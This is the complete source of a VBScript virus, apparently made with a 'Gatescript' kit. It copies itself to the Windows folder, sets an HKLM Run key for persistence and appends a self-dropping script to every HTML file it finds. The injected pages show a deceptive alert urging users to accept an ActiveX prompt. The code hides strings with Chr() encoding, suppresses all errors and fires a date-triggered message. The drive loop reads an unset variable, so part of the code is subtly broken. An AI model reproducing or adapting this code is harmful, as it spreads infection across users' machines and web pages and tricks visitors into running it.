'KAVAR
ON ERROR RESUME NEXT
Dim DONOTEDITcmsgsxahrs
Dim DONOTEDITcborrsxahrs
Dim DONOTEDITccolsxahrs
Dim zsxahrs
Dim DONOTEDITnarsxahrs
Dim DONOTEDITdisxahrs
Dim DONOTEDITvalsxahrs
Dim DONOTEDITsensxahrs
Dim DONOTEDITtecsxahrs
Dim vtecsxahrs
Dim Cosxahrs
Set DONOTEDITwshsxahrs = CreateObject("WScript.Shell")
Set DONOTEDITfsosxahrs= CreateObject("scripting.filesystemobject")
DONOTEDITfsosxahrs.copyfile wscript.scriptfullname,DONOTEDITfsosxahrs.GetSpecialFolder(0) & "\kruls1.vbs"
DONOTEDITwshsxahrs.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\kruls","wscript.exe " & DONOTEDITfsosxahrs.GetSpecialFolder(0) & "\kruls1.vbs %"
DONOTEDITwshsxahrs.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
If DONOTEDITwshsxahrs.regread("HKCU\software\kruls\html") <> "1" Then
HTML()
End If
Function HTML()
ON ERROR RESUME NEXT
For Each drvarsxahrs In DONOTEDITfsosxahrs.drives
Unsxahrs = drsxahrs & "\"
Call HTLsxahrs(Unsxahrs)
Next
End Function
Function HTLsxahrs(Vasxahrs)
Cosxahrs = ""
Set mesxahrs = DONOTEDITfsosxahrs.OpenTextFile(wscript.scriptfullname, 1)
Do While mesxahrs.AtendOfStream = False
Linsxahrs = mesxahrs.ReadLine
Cosxahrs = Cosxahrs & Chr(34) & " & vbCrLf & " & Chr(34) & Replace(Linsxahrs, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
Loop
mesxahrs.Close
Crsxahrs = Vasxahrs
Set fosxahrs = DONOTEDITfsosxahrs.GetFolder(Crsxahrs)
For Each Resxahrs In DONOTEDITfsosxahrs.GetFolder(Crsxahrs).Files
If LCase(DONOTEDITfsosxahrs.GetExtensionName(Resxahrs))="html" Or LCase(DONOTEDITfsosxahrs.GetExtensionName(Resxahrs))="htm" Then
Dim Fpsxahrs
Dim Srlsxahrs
Set Fpsxahrs = DONOTEDITfsosxahrs.OpenTextFile(Resxahrs,1,False)
Srlsxahrs= Fpsxahrs.ReadAll
Fpsxahrs.Close
Dim Tmpsxahrs
Tmpsxahrs = ""
Tmpsxahrs = Tmpsxahrs & VbCrlf & "<html> <body> <script language=" & Chr(34) & "vbscript" & Chr(34) & ">"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "ON ERROR RESUME NEXT"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "Set fsosxahrs = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) &")"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "Set Fssxahrs= fsosxahrs.CreateTextFile(fsosxahrs.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs" & Chr(34) & " , True)"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "Fssxahrs.write" & Chr(34) & Cosxahrs & Chr(34)
Tmpsxahrs = Tmpsxahrs & VbCrlf & "Fssxahrs.Close"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "Set wssxahrs = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "wssxahrs.run fsosxahrs.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fsosxahrs.getspecialfolder(0) & " & Chr(34) & "\Temp.vbs %" & Chr(34)
Tmpsxahrs = Tmpsxahrs & VbCrlf & "If err.number <> 0 Then"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "alert(" & Chr(34) & "you should have installed active X component to see this page properly, choose 'yes' when prompted" & Chr(34) & " & vbCrLf & " & Chr(34) & "" & Chr(34) & ")"
Tmpsxahrs = Tmpsxahrs & VbCrlf & "End If"
Tmpsxahrs = Tmpsxahrs & VbCrlf & Chr(60) & Chr(47) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(62) & Chr(32) & Chr(60)& Chr(47) & Chr(98) & Chr(111) & Chr(100) & Chr(121) & Chr(47) & Chr(62) & Chr(32) & Chr(60) & Chr(47) & Chr(104) & Chr(116) & Chr(109) & Chr(108) & Chr(62)
Set Htrsxahrs = DONOTEDITfsosxahrs.OpenTextFile(Resxahrs,2,1)
Htrsxahrs.write Srlsxahrs & vbCrlf & Tmpsxahrs
Htrsxahrs.Close
End If
Next
Set Basxahrs= Fosxahrs.SubFolders
For Each Casxahrs In Basxahrs
Call HTLsxahrs(Casxahrs)
Next
DONOTEDITwshsxahrs.regwrite "HKCU\software\kruls\html","1"
End Function
If month(now) = 9 and day(now) = 10 Then
msgbox "you should see this funny pic"
End If
'Gatescript - Geocities.com/gatescript
